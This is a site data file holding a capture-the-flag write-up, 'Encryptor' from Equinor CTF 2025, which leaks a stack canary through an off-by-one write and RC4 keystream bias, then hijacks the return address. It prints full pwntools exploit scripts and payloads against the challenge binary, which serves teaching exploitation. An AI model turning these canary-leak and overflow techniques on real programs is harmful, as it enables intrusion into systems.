
[{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/bias/","section":"Tags","summary":"","title":"Bias","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/crypto/","section":"Topics","summary":"Cryptography challenges, attacks, and implementations.","title":"Crypto","type":"topics"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/","section":"Ctfs","summary":"","title":"Ctfs","type":"ctfs"},{"content":" Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!\nncat --ssl encryptor-pwn.ept.gg 1337 The challenge provides a single ELF binary, encryptor, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.\nWelcome to the EPT encryptor! Please behave yourself, and remember to stay away from a certain function at 0x55667a4c54f0! 1. Encrypt a message 2. Reset the key and encrypt again 3. Change offset 4. Exit \u0026gt; Binary protections # All standard mitigations are enabled.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Despite PIE, the address of win() is printed on startup, which removes the need for an infoleak later.\nReverse engineering # Encryption logic # Menu option 1 allows the user to encrypt an arbitrary string.\nif (menu_choice == 1) { printf(\u0026#34;Enter string to encrypt\\n\u0026gt; \u0026#34;); fgets(local_108,242,stdin); RC4(key,local_108 + local_18,local_1f8,local_108 + local_18); puts_hex(local_1f8); resetKey(); } Two issues immediately stand out:\nfgets() reads 242 bytes into a 240-byte buffer The RC4 input pointer is offset by local_18 Relevant stack layout:\nuchar local_1f8 [240]; // ciphertext char local_108 [240]; // user input This allows a 1-byte overwrite past local_108, corrupting local_18, the RC4 input offset.\nDisabled offset control # There is a menu option intended to change this offset:\n\u0026gt; 3 Sorry, offset function disabled due to abuse! However, because local_18 sits directly after the input buffer, the off-by-one write lets us modify it anyway.\nStack layout and target # The relevant portion of the stack looks like this:\n[ input buffer ] 240 bytes [ offset byte ] 1 byte (+ padding) [ stack canary ] 8 bytes [ saved rbp ] 8 bytes [ return address ] 8 bytes By controlling the RC4 input offset, we can align encryption over the stack canary bytes.\nRC4 keystream bias # RC4 is a stream cipher that generates a keystream K and encrypts via XOR:\n$$ C = P \\oplus K $$\nRC4 is known to have biased output bytes. In particular, the second keystream byte is biased toward 0x00 with probability: $$ \\Pr[K_2 = 0] = \\frac{1}{128} $$\ninstead of the uniform 1/256.\nThis bias allows a distinguishing attack: if the plaintext byte is constant, the most frequent ciphertext byte converges to the plaintext value.\nCanary leakage via bias # By:\nForcing RC4 to encrypt a chosen stack byte Aligning that byte with keystream position 2 Repeating encryption with fresh keys Taking the most frequent ciphertext byte we can recover that byte of plaintext.\nSince stack canaries on amd64 always start with a null byte, only the remaining 7 bytes need to be recovered.\nCanary recovery script # from pwn import * from collections import Counter p = process(\u0026#34;./encryptor\u0026#34;) p.recvuntil(b\u0026#34;at \u0026#34;) win = int(p.recvline().strip()[2:-1], 16) print(\u0026#34;Win:\u0026#34;, hex(win)) def encrypt(msg): p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, msg) p.recvuntil(b\u0026#34;Encrypted: \u0026#34;) return p.recvline().strip() def reset_key(): p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) p.recvuntil(b\u0026#34;Encrypted: \u0026#34;) return p.recvline().strip() def recover_canary_byte(i): encrypt(b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i)) c = Counter() for _ in range(6000): ct = reset_key() b = int(ct[2:4], 16) c[b] += 1 return c.most_common(1)[0][0] canary = b\u0026#34;\\x00\u0026#34; + bytes(recover_canary_byte(i) for i in range(1, 8)) print(f\u0026#34;canary = 0x{canary[::-1].hex()}\u0026#34;) Notes:\nThe first canary byte is known to be 0x00 The attack is probabilistic; sample count may need adjustment Runtime is long on remote due to repeated key resets Example output:\ncanary = 0x0d4fb028da4d3300 ret2win # The binary contains a hidden menu option:\nif (menu_choice == 1337) { printf(\u0026#34;Leaving already? Enter feedback:\\n\u0026gt; \u0026#34;); fgets(local_108,288,stdin); } This reads 288 bytes into a 240-byte buffer, allowing full control of the return address.\nWith the canary known and win() already leaked, exploitation is straightforward.\nFinal payload # payload = b\u0026#34;A\u0026#34; * 248 payload += canary payload += b\u0026#34;B\u0026#34; * 8 payload += p64(win) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, payload) p.interactive() Successful execution:\nEPT{local_test_flag_because_im_not_waiting_100_years_on_remote_again} Final solve script # Below is the consolidated exploit used locally and remotely.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0] for i in range(1, 8): counts = {j: 0 for j in range(256)} p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex(p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode()) counts[ct[1]] += 1 m = max(counts, key=counts.get) if counts[m] - sorted(counts.values())[-2] \u0026gt; 5: canary.append(m) break canary = bytes(canary) p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) print(p.recvall().decode()) Takeaways # RC4 is catastrophically broken even in nonstandard settings Off-by-one writes are often enough to break strong mitigations Stack canaries do not help when they can be leaked byte-by-byte “Disabled” features still matter if memory safety is broken This challenge is a good example of cryptographic weaknesses compounding memory corruption rather than replacing it.\n","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/ept-25/baby-rsa/","section":"Ctfs","summary":"Leaking a stack canary using RC4 keystream bias, then ret2win.","title":"Encryptor","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/ctfs/ept-25/","section":"Ctfs","summary":"","title":"Equinor CTF 2025","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/pwn/","section":"Topics","summary":"Binary exploitation and memory corruption challenges.","title":"Pwn","type":"topics"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/rc4/","section":"Tags","summary":"","title":"Rc4","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/stack-canary/","section":"Tags","summary":"","title":"Stack-Canary","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/stream-cipher/","section":"Tags","summary":"","title":"Stream-Cipher","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeup-page/topics/","section":"Topics","summary":"Browse writeups by category.","title":"Topics","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/ctfs/","section":"Topics","summary":"Writeups grouped by competition.","title":"CTFs","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/rev/","section":"Topics","summary":"Reverse engineering challenges and program analysis.","title":"Rev","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeup-page/topics/web/","section":"Topics","summary":"Web exploitation, logic bugs, and application vulnerabilities.","title":"Web","type":"topics"}]